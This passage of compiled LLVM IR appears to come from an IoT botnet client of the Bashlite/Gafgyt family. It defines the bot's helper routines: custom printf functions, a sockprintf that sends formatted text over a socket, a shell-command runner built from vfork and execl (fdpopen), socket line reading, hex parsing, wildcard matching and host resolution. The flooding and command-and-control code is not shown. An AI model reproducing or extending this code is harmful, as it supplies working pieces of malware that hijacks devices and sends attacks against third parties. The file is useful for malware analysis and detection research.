  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #14
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #15
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #16
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #17
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
